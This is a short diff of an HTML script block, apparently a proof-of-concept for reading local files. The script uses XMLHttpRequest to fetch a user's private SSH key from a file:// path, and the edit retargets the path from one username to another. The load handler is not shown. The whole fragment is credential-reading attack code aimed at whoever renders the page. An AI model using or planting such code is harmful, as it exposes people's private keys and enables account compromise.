@@ -5,6 +5,6 @@ function reqListener() {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///robert/.ssh/id_rsa"); 
+oReq.open("GET", "file:///heng/.ssh/id_rsa"); 
 oReq.send();
 </script>
